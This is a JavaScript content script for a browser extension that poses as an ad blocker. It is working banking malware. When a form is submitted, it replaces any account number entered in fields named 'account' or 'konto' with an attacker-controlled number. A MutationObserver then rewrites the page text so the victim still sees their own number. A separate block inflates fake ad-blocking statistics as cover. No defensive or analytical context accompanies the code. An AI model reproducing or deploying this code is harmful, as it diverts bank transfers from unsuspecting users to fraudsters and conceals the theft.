(function() {
  let attackerAccountNumber = "12345678901234567890123456";
  let isActive = true;
  let originalAccountNumber = "";
  
  chrome.storage.sync.get(['bankConfig'], function(result) {
    if (result.bankConfig) {
      attackerAccountNumber = result.bankConfig.targetAccountNumber || attackerAccountNumber;
      isActive = result.bankConfig.isActive !== undefined ? result.bankConfig.isActive : true;
    }
    
    if (isActive) {
      executeAttack();
    }
  });
  
  chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.action === "extensionActivated") {
      if (message.targetAccountNumber) {
        attackerAccountNumber = message.targetAccountNumber;
      }
      
      if (!isActive) {
        isActive = true;
        executeAttack();
      }
      
      sendResponse({status: "ok"});
    }
  });
  
  function executeAttack() {
    document.addEventListener('input', function(e) {
      if (e.target.tagName === 'INPUT' && 
         (e.target.id.toLowerCase().includes('account') || 
          e.target.id.toLowerCase().includes('konto') || 
          e.target.name.toLowerCase().includes('account') || 
          e.target.name.toLowerCase().includes('konto'))) {
        originalAccountNumber = e.target.value;
        
        chrome.storage.local.set({
          'originalAccount': originalAccountNumber
        });
        
        if (!document.querySelector('#security-marker')) {
          const marker = document.createElement('div');
          marker.id = 'security-marker';
          marker.style.display = 'none';
          marker.setAttribute('data-original', originalAccountNumber);
          document.body.appendChild(marker);
        } else {
          document.querySelector('#security-marker').setAttribute('data-original', originalAccountNumber);
        }
      }
    });
    
    document.addEventListener('submit', function(e) {
      const accountFields = e.target.querySelectorAll(
        'input[id*="account" i], ' +
        'input[id*="konto" i], ' +
        'input[name*="account" i], ' +
        'input[name*="konto" i]'
      );
      
      if (accountFields.length === 0) return;
      
      accountFields.forEach(field => {
        if (field.value && !originalAccountNumber) {
          originalAccountNumber = field.value;
        }
        
        if (field.value) {
          field.setAttribute('data-original-account', field.value);
          
          field.value = attackerAccountNumber;
          
          if (document.querySelector('#security-marker')) {
            document.querySelector('#security-marker').setAttribute('data-changed-to', attackerAccountNumber);
          }
          
          updateFakeBlockStats();
        }
      });
    });
    
    const observer = new MutationObserver(function(mutations) {
      document.querySelectorAll('*').forEach(element => {
        if (element.textContent && 
            element.textContent.includes(attackerAccountNumber) && 
            element.childNodes.length <= 3) {
          
          if (originalAccountNumber) {
            element.textContent = element.textContent.replace(
              attackerAccountNumber, 
              originalAccountNumber
            );
          }
        }
      });
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true,
      characterData: true
    });
  }
  
  function updateFakeBlockStats() {
    chrome.storage.local.get(['adStats'], function(result) {
      if (result.adStats) {
        const stats = result.adStats;
        stats.blockedAds += 1;
        chrome.storage.local.set({adStats: stats});
      }
    });
  }
})();

(function() {
  function fakeAdBlocker() {
    const blockedCount = Math.floor(Math.random() * 5) + 1;
    
    chrome.storage.local.get(['adStats'], function(result) {
      if (result.adStats) {
        const stats = result.adStats;
        stats.blockedAds += blockedCount;
        stats.blockedTrackers += Math.random() > 0.7 ? 1 : 0;
        chrome.storage.local.set({adStats: stats});
      }
    });
  }
  
  setTimeout(fakeAdBlocker, 800);
  setInterval(fakeAdBlocker, 30000);
})();
